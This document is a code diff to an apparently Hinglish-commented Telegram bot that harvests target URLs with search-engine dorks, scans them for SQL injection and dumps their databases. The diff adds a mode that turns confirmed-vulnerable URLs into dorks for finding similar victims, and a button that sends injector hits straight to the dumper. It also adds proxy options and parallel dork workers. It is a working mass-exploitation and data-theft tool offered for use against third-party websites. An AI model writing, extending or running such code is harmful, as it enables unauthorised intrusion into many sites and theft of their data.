-            _dork_deadline = time.time() + max(8.0, eng_to * 2.2)   # 1 dork ka hard cap
-
-            async def _one_eng(eng, _page, _dl=_dork_deadline, _dork=dork):
-                """Ek engine — semaphore se limited (parse_threads)."""
-                if eng in _dead_engines or time.time() > _dl:
-                    return eng, None
-                async with _esem:
-                    if time.time() > _dl:
-                        return eng, None
-                    try:
-                        return eng, await fetch_engine(
-                            session, eng, _dork, None, page=_page,
-                            timeout=eng_to, rot=rot, miss=_miss)
-                    except Exception as exc:
-                        logger.info("engine %s fail: %s", eng, str(exc)[:80])
-                        return eng, None
-
+                    added.append(u)
+                got_any += 1 if gurls else 0
             for page in range(pages):
-                if len(out) >= max_urls or time.time() > _dork_deadline:
+                if got_any >= 2 or time.time() > dl:
                     break
-                order = list(eng_list)
-                random.shuffle(order)
-                order.sort(key=lambda e: _miss.get(e, 0) >= ENGINE_DEAD_AFTER)
-                got_any = 0
-                # ══ PARALLEL engines (threads) — waves me, counters single point pe ══
-                _alive = [e for e in order if e not in _dead_engines]
-                _need = 5 if (mode == "max" and len(rot)) else 3
-                while _alive and got_any < _need and time.time() <= _dork_deadline:
-                    wave, _alive = _alive[:_threads], _alive[_threads:]
-                    results = await asyncio.gather(
-                        *[_one_eng(e, page) for e in wave], return_exceptions=True)
-                    for item in results:
-                        if not isinstance(item, tuple):
-                            st["errors"] += 1
-                            continue
-                        eng, urls = item
-                        if eng is None:
-                            continue
+                for eng in order:
+                    if eng in _dead_engines:
+                        continue
+                    if got_any >= 2 or time.time() > dl:
+                        break
+                    urls = await _call_engine(eng, dork, page, dl)
+                    if urls is None:
+                        continue
+                    async with _lock:
+                        st["errors"] += 1 if not urls else 0
                         if not urls:
-                            st["errors"] += 1
                             if (_miss.get(eng, 0) >= ENGINE_DEAD_AFTER
                                     and eng not in _dead_engines):
                                 _dead_engines.add(eng)
                                 st["dead"].append(eng)
-                                logger.info("parse_deep: %s dead (%d miss) — run me skip",
+                                logger.info("parse_deep: %s dead (%d miss) — skip",
                                             eng, _miss.get(eng))
-                            continue
+                    if not urls:
+                        continue
+                    got_any += 1
+                    async with _lock:
+                        _ok_count[eng] += 1
                         st["engine_hits"][eng] += len(urls)
                         st["raw"] += len(urls)
-                        got_any += 1
-                        if strict:
-                            matched = [u for u in urls if dork_match(u, dork)]
-                            if matched:
-                                urls = matched
-                            else:                  # strict me kuch nahi mila → relaxed
+                    if strict:
+                        matched = [u for u in urls if dork_match(u, dork)]
+                        if matched:
+                            urls = matched
+                        else:
+                            async with _lock:
                                 st["relaxed"] += 1
-                        for u in urls:
-                            kk = u.split("#")[0]
-                            if kk in seen:
-                                st["junk"] += 1
-                                st["filtered"] += 1
-                                continue
-                            seen.add(kk)
-                            out.append(kk)
-                            if len(out) >= max_urls:
-                                break
-                        if got_any >= _need:
-                            break
-            st["unique"] = len(out)                  # live counter for the card
-            st["per_dork"] = round(st["scanned"] / max(0.001, time.time() - _t_start), 2)
-            if progress and (i % 2 == 0 or i == len(dorks)):
+                    added.extend(urls)
+            return added
+
+        async def _worker():
+            while True:
+                if _uid and stop_requested(_uid):
+                    async with _lock:
+                        st["stop"] = 1
+                    return
+                if budget and (time.time() - _t_start) > budget:
+                    async with _lock:
+                        st["time_up"] = 1
+                    return
+                async with _lock:
+                    if not _queue:
+                        return
+                    i, dork = _queue.popleft()
                 try:
-                    await progress(st)
-                except Exception:
-                    pass
+                    got = await _scan_dork(i, dork)
+                except Exception as exc:
+                    logger.info("dork %d fail: %s", i, str(exc)[:70])
+                    got = []
+                async with _lock:
+                    st["scanned"] += 1
+                    st["unique"] = len(out)
+                    st["per_dork"] = round(st["scanned"] /
+                                           max(0.001, time.time() - _t_start), 2)
+                    for u in got:
+                        kk = u.split("#")[0]
+                        if kk in seen:
+                            st["junk"] += 1
+                            st["filtered"] += 1
+                            continue
+                        seen.add(kk)
+                        out.append(kk)
+                        if len(out) >= max_urls:
+                            break
+                    _do_prog = (progress and (time.time() - _prog_at[0] > 1.8))
+                    if _do_prog:
+                        _prog_at[0] = time.time()
+                if _do_prog:
+                    try:
+                        await progress(st)
+                    except Exception:
+                        pass
+
+        logger.info("parse_deep: %d dorks • %d workers • engines %s",
+                    len(dorks), min(_dork_conc, len(dorks)), ",".join(eng_list))
+        await asyncio.gather(*[_worker() for _ in range(min(_dork_conc, len(dorks)))])
+        st["remaining_dorks"] = [d for _, d in list(_queue)[:6000]]
+        st["workers"] = _dork_conc
 
     st["unique"] = len(out)
     st["filtered"] = max(st["filtered"], st["raw"] - st["unique"])
@@ -5032,7 +5361,7 @@ def help_text() -> str:
               "(%d themes).\n\n" % len(THEMES)
             + tag("ENGINES") + "\n"
             + "Slow on a phone? Use <code>/engines fast</code> — "
-              "only 3 engines (DuckDuckGo Lite • DDG • Bing, no proxy needed).\n"
+              "only 3 engines (Bing • Mojeek • DDG Lite — no proxy needed).\n"
               "Normal = 5, Max = all 7. You can also switch from the 🎛 button on the PARSER screen.\n\n"
             + tag("FILE FORMATS") + "\n"
             + "txt • csv • tsv • json • log • html • xlsx • docx • pptx • zip • gz — "
@@ -5332,6 +5661,10 @@ async def _on_callback_inner(update: Update, context: ContextTypes.DEFAULT_TYPE)
     if data.startswith("th:set:"):
         return await cb_theme_set(update, context, data[7:])
 
+    # ── URL reverse modes ──
+    if data.startswith("rv:"):
+        return await cb_rev_mode(update, context, data[3:])
+
     # ── premium emoji slot pick (admin) ──
     if data.startswith("se:set:"):
         if not is_admin(uid):
@@ -5487,6 +5820,16 @@ async def _route_tool_cb(update, context, data: str):
             return await cb_parse_cfg(update, context, rest[4:])
         if rest == "limit":
             return await cb_parse_limit(update, context)
+        if rest == "rest":
+            rest_d = context.user_data.get("parse_rest") or []
+            if not rest_d:
+                try:
+                    await update.callback_query.answer("Kuch bacha nahi — sab scan ho gaya",
+                                                       show_alert=True)
+                except Exception:
+                    pass
+                return
+            return await launch_deep(update, context, rest_d)
         if rest == "paste":
             dorks = context.user_data.get("paste_dorks") or []
             if not dorks:
@@ -5511,6 +5854,17 @@ async def _route_tool_cb(update, context, data: str):
             return await cb_dump_old(update, context)
         if rest == "harv":
             return await cb_dump_harv(update, context)
+        if rest == "frominj":
+            targets = dict(context.user_data.get("inj_confirmed") or {})
+            urls = list(targets.keys())
+            if not urls:
+                try:
+                    await update.callback_query.answer(
+                        "Pehle INJECTOR chalao — confirmed URLs chahiye", show_alert=True)
+                except Exception:
+                    pass
+                return
+            return await _run_sqldump(update, context, urls, targets=targets)
         if rest == "paste":
             urls = context.user_data.get("paste_urls") or []
             if not urls:
@@ -7059,15 +7413,100 @@ async def cb_kw_action(update, context, action: str):
 # ═══════════════════════════════════════════════════════════════════════════════
 async def tool_rev(update, context):
     q = update.callback_query
-    txt = (H("URL REVERSE", "", slot="rev") + "\n\n"
-           "Paste URL(s) — one per line:\n\n"
-           "<code>https://shop.example.com/product.php?id=12&cat=5</code>\n\n"
-           "I will pull out host, path, extension and parameters, then build dorks from them.")
+    txt = (H("URL REVERSE", "2 modes", slot="rev") + "\n\n"
+           + B("1) Normal reverse") + "\n"
+           + P("URL do → host / path / ext / params nikaal ke dorks banate hain.") + "\n\n"
+           + B("2) Vulnerable URL → UHQ dorks") + "\n"
+           + P("Jo URL vulnerable nikla uska shape (file + param + ext + TLD) pakad ke "
+               "waise hi doosre targets dhoondhte hain — <b>bina keywords</b>.") + "\n\n"
+           + B("Paste URLs") + "\n"
+           + "<code>https://shop.example.com/product.php?id=12&amp;cat=5</code>")
+    kb = RK([
+        [InlineKeyboardButton("💉 VULNERABLE URL → UHQ DORKS", callback_data="rv:vuln")],
+        [InlineKeyboardButton("🔗 NORMAL REVERSE", callback_data="rv:normal")],
+        [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")],
+    ])
     try:
-        await q.edit_message_text(txt, reply_markup=kb_back(), parse_mode=ParseMode.HTML)
+        await q.edit_message_text(txt, reply_markup=kb, parse_mode=ParseMode.HTML)
+    except Exception:
+        pass
+
+
+async def cb_rev_mode(update, context, mode: str = "normal"):
+    """rv:normal / rv:vuln — input state set karo."""
+    q = update.callback_query
+    if mode == "vuln":
+        try:
+            await q.edit_message_text(
+                (H("VULN → UHQ DORKS", "bina keywords", slot="rev") + "\n\n"
+                 + P("Vulnerable URL(s) paste karo — jo injector ne diye.")
+                 + "\n\n<code>https://site.com/product.php?id=12</code>\n\n"
+                 + B("Kya milega") + "\n"
+                 + "◆ same file + same param dorks\n"
+                 + "◆ same extension / same folder shape\n"
+                 + "◆ same TLD targets\n"
+                 + "◆ error-page dorks (known SQL error)" ),
+                parse_mode=ParseMode.HTML,
+                reply_markup=RK([[InlineKeyboardButton("⬅️ BACK", callback_data="m:rev")]]))
+        except Exception:
+            pass
+        await_set(context, "rev_vuln")
+        return
+    try:
+        await q.edit_message_text(
+            (H("URL REVERSE", "normal", slot="rev") + "\n\n"
+             + P("Paste URL(s), one per line:") + "\n\n"
+             + "<code>https://shop.example.com/product.php?id=12&amp;cat=5</code>"),
+            parse_mode=ParseMode.HTML,
+            reply_markup=RK([[InlineKeyboardButton("⬅️ BACK", callback_data="m:rev")]]))
     except Exception:
         pass
     await_set(context, "rev_urls")
+
+
+async def input_rev_vuln(update, context, text: str):
+    """Vulnerable URLs → UHQ dorks (keywords ke bina)."""
+    urls = _urls_from_text(text, 50)
+    if not urls:
+        urls = [x.strip() for x in re.split(r"[\s,]+", text or "") if x.strip()][:50]
+    infos = [i for i in (url_reverse(u) for u in urls) if i]
+    if not infos:
+        await update.effective_message.reply_text(
+            "❌ Valid URL nahi mila. Poora URL bhejo: "
+            "<code>https://site.com/page.php?id=1</code>", parse_mode=ParseMode.HTML,
+            reply_markup=kb_back("m:rev"))
+        return
+    dorks = vuln_reverse_dorks(urls, n=90)
+    if not dorks:
+        await update.effective_message.reply_text(
+            "❌ Is URL se dork nahi bane (path/parameter missing).",
+            reply_markup=kb_back("m:rev"))
+        return
+    context.user_data["last_dorks"] = dorks
+    lines = []
+    for i in infos[:4]:
+        lines.append("◆ <b>%s</b>\n   file <code>%s</code> · ext <code>%s</code> · "
+                     "param <code>%s</code>"
+                     % (esc(i.get("host") or "?"), esc(i.get("file") or "—"),
+                        esc(i.get("ext") or "—"),
+                        esc(", ".join(i.get("params") or []) or "—")))
+    body = (H("VULN → UHQ DORKS", "%d dorks" % len(dorks), slot="rev") + "\n\n"
+            + "\n\n".join(lines) + "\n\n"
+            + B("Top dorks") + "\n" + short_list(dorks[:10], 10) + "\n\n"
+            + P("Sirf structure — koi keyword nahi. Ye dorks wahi technology / wahi "
+                "parameter shape wale targets dhoondhte hain."))
+    for ch in chunk_lines(body)[:2]:
+        await update.effective_message.reply_text(ch, parse_mode=ParseMode.HTML)
+    await update.effective_message.reply_text(
+        "👇 Next?",
+        reply_markup=RK([
+            [InlineKeyboardButton("🚀 DEEP SCAN THESE DORKS", callback_data="pr:deep")],
+            [InlineKeyboardButton("🎯 MAKE MORE", callback_data="rv:vuln")],
+            [InlineKeyboardButton("⬅️ BACK", callback_data="m:rev")],
+        ]))
+    path, cnt = dump_text(dorks, "vuln_reverse", "PYTHON SNAKE — vuln URL → UHQ dorks")
+    await send_file(update, path, "🔗 %d UHQ dorks" % cnt)
+    await_clear(context)
 
 
 async def input_rev_urls(update, context, text: str):
@@ -7216,13 +7655,17 @@ def _inj_progress_card(st: dict, spin: int) -> str:
     took = max(0.001, time.time() - st["start"])
     speed = st["tested"] / took
     left = max(0, st["total"] - st["tested"])
-    eta = (left / speed) if speed > 0.1 else 0
+    eta = (left / speed) if speed > 0.05 else 0
     return (H("SCANNING", "%s • %d probes" % (CAT_LABEL.get(st.get("cat"), "ALL"),
                                               len(inj_probes_for(st.get("cat") or "all"))))
             + "\n\n" + bar2(pct, 14, spin) + "\n\n"
-            + "◆ URLs       : <code>%s/%s</code>\n" % (fmt(st["urls_done"]), fmt(st["urls"]))
-            + "◆ Tested     : <code>%s/%s</code>\n" % (fmt(st["tested"]), fmt(st["total"]))
-            + "◆ Vulnerable : <code>%s</code>\n" % fmt(len(st["vulns"]))
+            + "◆ URLs       : <code>%s/%s</code>  <i>(kitne sites)</i>\n"
+              % (fmt(st["urls_done"]), fmt(st["urls"]))
+            + "◆ Requests   : <code>%s/%s</code>  <i>(probe calls)</i>\n"
+              % (fmt(st["tested"]), fmt(st["total"]))
+            + "◆ Vulnerable : <code>%s</code>%s\n"
+              % (fmt(len(st["vulns"])),
+                 (" (+%d need verify)" % st["suspected"]) if st.get("suspected") else "")
             + "◆ Blocked    : <code>%s</code>\n" % fmt(st["blocked"])
             + "◆ Speed      : <code>%.1f req/s</code>\n" % speed
             + "◆ ETA        : <code>%s</code>" % (("%.0fs" % eta) if eta else "—"))
@@ -7271,7 +7714,7 @@ async def _run_inject(update, context, urls):
             pass
 
     st = await inj_scan(urls, cat, progress=prog, uid=uid,
-                        timeout=float(sget("inj_timeout", 8) or 8),
+                        timeout=float(sget("inj_timeout", 6) or 6),
                         conc=int(sget("inj_conc", 40) or 40),
                         max_targets=int(sget("inj_targets", 24) or 24))
     vulns = st["vulns"]
@@ -7282,10 +7725,13 @@ async def _run_inject(update, context, urls):
         "🛡 <b>No vulnerabilities found</b>"
     body = (H("SQLi SCAN COMPLETE", "%.1fs" % took) + "\n\n"
             + head + "\n"
-            + "🎯 Total tested: <code>%s</code>\n" % fmt(st["tested"])
             + "🌐 URLs scanned: <code>%s</code> (clean <code>%s</code>)\n" % (fmt(st["urls_done"]), fmt(clean))
+            + "🧪 Requests: <code>%s</code> · ⚡ <code>%.1f req/s</code>\n" % (fmt(st["tested"]), speed)
             + "🚫 Blocked: <code>%s</code>\n" % fmt(st["blocked"])
-            + "⚡ Speed: <code>%.1f req/s</code>\n" % speed
+            + ("⚠️ Unverified: <code>%s</code> (2nd check fail — confidence low)\n"
+               % fmt(st["suspected"]) if st.get("suspected") else "")
+            + ("💀 Dead hosts skipped: <code>%s</code>\n" % fmt(len(st.get("dead_hosts") or []))
+               if st.get("dead_hosts") else "")
             + ("⛔ Stopped early\n" if st.get("stopped") else "")
             + "\n" + bar2(100, 14, None))
     if vulns:
@@ -7298,9 +7744,16 @@ async def _run_inject(update, context, urls):
         await msg.delete()
     except Exception:
         pass
+    _n_v = len(_uniq([v["base"] for v in vulns])) if vulns else 0
+    _rows = []
+    if _n_v:
+        _rows.append([InlineKeyboardButton("📁 DUMP THESE %d URL(s)" % _n_v,
+                                           callback_data="df:frominj")])
+    _rows.append([InlineKeyboardButton("⬅️ INJECTOR", callback_data="m:inj")])
+    _kb_done = RK(_rows)
     for ch in chunk_lines(body)[:3]:
         await reply_msg(update).reply_text(ch, parse_mode=ParseMode.HTML,
-                                           reply_markup=kb_back("m:inj"))
+                                           reply_markup=_kb_done)
     if vulns:
         base_urls = _uniq([v["base"] for v in vulns])
         path, cnt = dump_text(base_urls, "vuln_" + str(cat),
@@ -7317,6 +7770,7 @@ async def _run_inject(update, context, urls):
             f.write("\n".join(rows) + "\n")
         await send_file(update, csvp, "📊 Full report (csv)")
         context.user_data["last_vulns"] = vulns
+        context.user_data["inj_confirmed"] = {v["base"]: v["param"] for v in vulns}
     context.user_data["last_inj_stats"] = {k: st[k] for k in
                                            ("tested", "total", "urls", "blocked", "took")}
     context.user_data.pop("inj_pending", None)
@@ -7358,7 +7812,7 @@ async def tool_parse(update, context):
                                       else "<code>%s</code>" % fmt(int(sget("parse_url_limit", 0)))), "🌐")
            + "\n" + KV("Pages / Threads", "<code>%d</code> · <code>%d</code> parallel"
                        % (int(sget("parse_pages", 1) or 1),
-                          int(sget("parse_threads", 4) or 4)), "⚙️")
+                          int(sget("parse_threads", 6) or 6)), "⚙️")
            + "\n" + KV("Timeout", "<code>%ss</code>" % int(sget("parse_timeout", 0) or
                                                             ENGINE_TIMEOUT.get(mode, 8)), "⏱")
            + "\n\n" + P("DDG Lite • DDG • Bing run fine on mobile data. "
@@ -7437,7 +7891,7 @@ async def cb_parse_limit(update, context):
 
 PARSER_CYCLES = {
     "pages":   ("parse_pages", [1, 2, 3, 5], "Pages per dork"),
-    "threads": ("parse_threads", [2, 3, 4, 6, 8], "Parallel engines"),
+    "threads": ("parse_threads", [2, 3, 4, 6, 8], "Parallel dorks"),
     "timeout": ("parse_timeout", [6, 8, 12, 20], "Engine timeout (s)"),
 }
 
@@ -7460,7 +7914,7 @@ async def cb_parse_cfg(update, context, key: str = ""):
         return await cb_parse_cfg(update, context, "")
     mode = user_mode(context)
     pages = int(sget("parse_pages", 1) or 1)
-    threads = int(sget("parse_threads", 4) or 4)
+    threads = int(sget("parse_threads", 6) or 6)
     to = int(sget("parse_timeout", 0) or ENGINE_TIMEOUT.get(mode, 8))
     limit = int(sget("parse_url_limit", 0) or 0)
     rows = [
@@ -7475,7 +7929,7 @@ async def cb_parse_cfg(update, context, key: str = ""):
     ]
     txt = (H("PARSER SETTINGS", "your own speed") + "\n\n"
            + KV("Pages", "<code>%d</code> — har dork ke kitne result pages" % pages, "📄")
-           + "\n" + KV("Threads", "<code>%d</code> — ek saath kitne engines" % threads, "🧵")
+           + "\n" + KV("Threads", "<code>%d</code> — ek saath kitne dorks" % threads, "🧵")
            + "\n" + KV("Timeout", "<code>%ss</code> per engine request" % to, "⏱")
            + "\n" + KV("URL limit", "<b>ALL</b>" if not limit else "<code>%s</code>" % fmt(limit), "🎯")
            + "\n" + KV("Engines", "<b>%s</b>" % ENGINE_LABEL[mode], "🎛")
@@ -7581,8 +8035,19 @@ async def input_deep_max(update, context, text: str):
     st = res["stats"]
     urls = res["urls"]
     context.user_data["last_urls"] = urls
+    _rest = (st.get("remaining_dorks") or []) if st.get("time_up") else []
+    context.user_data["parse_rest"] = _rest
     eng = ", ".join("%s:%d" % (a, b) for a, b in
                     sorted(st["engine_hits"].items(), key=lambda z: -z[1])[:4]) or "—"
+    _health = []
+    for _e in engine_list(st.get("mode") or "normal"):
+        _h = int(st["engine_hits"].get(_e, 0))
+        if _h:
+            _health.append("✅ %s <code>%s</code>" % (_e, fmt(_h)))
+        else:
+            _why = engine_reason((ENGINE_LAST.get(_e) or ("", 0))[0]) or "no results"
+            _health.append("❌ %s <i>%s</i>" % (_e, esc(_why[:28])))
+    health_line = " · ".join(_health[:6])
     card = (H("DEEP PARSER — COMPLETE", "%.1fs" % took) + "\n\n"
             "Scanned: <code>%d/%d</code> dorks\n"
             "Raw URLs: <code>%s</code>\n"
@@ -7590,12 +8055,15 @@ async def input_deep_max(update, context, text: str):
             "🌐 Common Crawl: <code>%s</code>\n"
             "🐦 Google (free): <code>%s</code>\n"
             "🔑 API: <code>%s</code>\n"
-            "⚙️ Engines: <code>%s</code>\n\n"
+            "⚙️ Engines: <code>%s</code>\n"
+            "🧵 Parallel dorks: <code>%s</code>\n"
+            "🔎 %s\n\n"
             "%s\n%s\n%s\n%s\n%s\n\n"
             "[%s] <b>100%%</b>\n\n"
             "📦 <b>Files ready</b>"
             % (st["scanned"], st["total"], fmt(st["raw"]), fmt(st["unique"]),
                fmt(st["cc"]), fmt(st.get("gj", 0)), fmt(st["api"]), esc(eng),
+               fmt(st.get("workers", 0)), health_line,
                KV("Engine block", "that is what the 'errors' were — <code>%s</code> (IP/proxy block)" % fmt(st["errors"]), "⚠️"),
                KV("Relaxed", "<code>%s</code> strict attempts returned 0, so it took unfiltered" % fmt(st.get("relaxed", 0)), "⚖️"),
                KV("Filtered", "<code>%s</code> (junk %s • mismatch %s)"
@@ -7612,8 +8080,18 @@ async def input_deep_max(update, context, text: str):
         await msg.delete()
     except Exception:
         pass
-    for ch in chunk_lines(card)[:2]:
-        await update.effective_message.reply_text(ch, parse_mode=ParseMode.HTML)
+    _kb_next = None
+    if _rest:
+        _kb_next = RK([
+            [InlineKeyboardButton("▶️ CONTINUE — %d dorks left" % len(_rest),
+                                  callback_data="pr:rest")],
+            [InlineKeyboardButton("⬅️ PARSER", callback_data="m:parse")],
+        ])
+    _chunks = chunk_lines(card)[:2]
+    for _i, ch in enumerate(_chunks):
+        await update.effective_message.reply_text(
+            ch, parse_mode=ParseMode.HTML,
+            reply_markup=_kb_next if _i == len(_chunks) - 1 else None)
     if urls:
         path, cnt = dump_text(urls, "deep", "PYTHON SNAKE — deep scan")
         await send_file(update, path, "🌐 %d unique URLs" % cnt)
@@ -8745,7 +9223,11 @@ async def sqli_dump_one(session, raw: str, param: str = "", caps=None,
             res["param"] = pn
             break
     if not det.get("ok"):
-        res.update(status="not injectable", why=det.get("why") or "no injection point",
+        _why = det.get("why") or "no injection point"
+        if param:
+            _why = ("injector ne confirm kiya tha, par dump ke waqt output nahi mila "
+                    "(WAF / blind) → %s" % _why)
+        res.update(status="not injectable", why=_why,
                    requests=budget["used"], took=time.time() - t0)
         return res
 
@@ -9364,6 +9846,9 @@ async def _run_sqldump(update, context, urls, targets=None):
     results = st["results"]
     okn = st["injectable"]
     large = [r for r in results if r.get("ok") and r.get("large")]
+    # Injector vs Dumper ka farak saaf dikhao (5 vs 3 wali confusion khatam)
+    _confirmed_n = len([u for u in urls if (targets or {}).get(u)]) if targets else 0
+    _not_dumped = [r for r in results if not r.get("ok")] if targets else []
     head = ("🎯 <b>%d of %d URL(s) injectable</b>" % (okn, len(results))) if okn else \
         "🛡 <b>No injectable URL found</b>"
     card = (H("SQL DUMP COMPLETE", "%.1fs" % st.get("took", 0)) + "\n\n"
@@ -9373,6 +9858,11 @@ async def _run_sqldump(update, context, urls, targets=None):
             + "❖ Files   : <code>%s</code>\n" % fmt(len(saved["files"]))
             + ("⚠️ Large data: <code>%s</code> URL(s) — use a powerful tool\n" % fmt(len(large))
                if large else "")
+            + (( "💉 Injector confirmed : <code>%d</code>\n" % _confirmed_n
+                 + "✅ Dumped            : <code>%d</code>\n" % okn
+                 + "⏭ Needs sqlmap      : <code>%d</code> (WAF / blind / no output)\n"
+                   % len(_not_dumped))
+               if targets else "")
             + ("⛔ Stopped early\n" if st.get("stopped") else "")
             + "\n" + bar3(100, 12, None) + "\n\n" + B("Results"))
     for res in results[:6]:
@@ -10806,6 +11296,7 @@ AWAIT_HANDLERS = {
     "kw_input": input_kw_input,
     "kw_count": input_kw_count,
     "rev_urls": input_rev_urls,
+    "rev_vuln": input_rev_vuln,
     "inj_urls": input_inj_urls,
     "dump_urls": input_dump_urls,
     "harvest_urls": input_harvest_urls,
@@ -11591,7 +12082,7 @@ async def admin_callback(update, context, action: str):
                                         "✅ ON • %d endpoints" % len(gj_pool())), "🐦"),
                      KV("Common Crawl", "✅ always on (free)", "🌐"),
                  ])
-                 + "\n\n<i>Even with no keys, all 7 engines + Common Crawl keep working.</i>\n\n"
+                 + "\n\n<i>Even with no keys, all 9 engines + Common Crawl keep working.</i>\n\n"
                  "📋 Free + paid list: <code>/apis</code>",
                  RK([
                      [InlineKeyboardButton("📋 API LIST (/apis)", callback_data="a:apis")],
@@ -12040,7 +12531,7 @@ def engines_text(context=None) -> str:
             + B("How to change") + "\n"
             + "<code>/engines fast</code> — 3 engines (fastest on a phone)\n"
             + "<code>/engines normal</code> — 5 engines\n"
-            + "<code>/engines max</code> — all 7 engines (proxy recommended)\n\n"
+            + "<code>/engines max</code> — all 9 engines (proxy recommended)\n\n"
             + "<i>DDG Lite • DDG • Bing work without a proxy. "
               "Google and Yandex block your IP without one — that is where the errors come from.</i>")
 
@@ -12140,7 +12631,8 @@ BATCH_KEYS = {
     "budget":  ("parse_budget", 60, 7200, "Scan time budget (min→sec)", 1800, "⏳"),
     "injtargets": ("inj_targets", 6, 300, "Injector tests per URL", 36, "🔍"),
     "injconc": ("inj_conc", 5, 200, "Injector parallel requests", 30, "⚡"),
-    "injtime": ("inj_timeout", 3, 30, "Injector request timeout (s)", 8, "⏱"),
+    "injtime": ("inj_timeout", 3, 30, "Injector request timeout (s)", 6, "⏱"),
+    "injproxy": ("inj_proxy", 0, 1, "Injector: proxy use (0=off, 1=on)", 0, "🧅"),
     "dumpconc": ("dump_conc", 2, 60, "Dumper parallel pages", 12, "📄"),
     "dumptime": ("dump_timeout", 5, 45, "Dumper page timeout (s)", 10, "⌛"),
     "dumptables": ("dump_tables", 1, 100, "Dump: tables per URL", 8, "🗃"),
@@ -12149,7 +12641,7 @@ BATCH_KEYS = {
     "dumpblindrows": ("dump_blind_rows", 0, 50, "Dump: blind rows per table", 0, "🐢"),
     "dumpreq": ("dump_requests", 100, 5000, "Dump: request cap per URL", 500, "🔋"),
     "pages": ("parse_pages", 1, 10, "Parser pages per dork", 1, "📄"),
-    "threads": ("parse_threads", 1, 10, "Parser parallel engines", 4, "🧵"),
+    "threads": ("parse_threads", 1, 10, "Parser parallel dorks", 6, "🧵"),
     "ptimeout": ("parse_timeout", 4, 40, "Parser engine timeout (s)", 8, "⏱"),
 }
 
@@ -12177,7 +12669,8 @@ def batch_card() -> str:
             "<code>/batch limit 0</code> — 0 = as many as found (ALL)\n"
             "<code>/batch budget 20</code> — scan runs for 20 minutes\n"
             "<code>/batch injtargets 36</code> — injector tests per URL\n"
-            "<code>/batch injconc 30</code> · <code>/batch injtime 8</code>\n"
+            "<code>/batch injconc 30</code> · <code>/batch injtime 6</code>\n"
+            "<code>/batch injproxy 0</code> — 0 = direct (tez), 1 = free proxies\n"
             "<code>/batch dumpconc 12</code> · <code>/batch dumptime 10</code>\n"
             "<code>/batch dumptables 15</code> · <code>/batch dumprows 50</code>\n"
             "<code>/batch dumpblind 1</code> · <code>/batch dumpreq 800</code>\n"
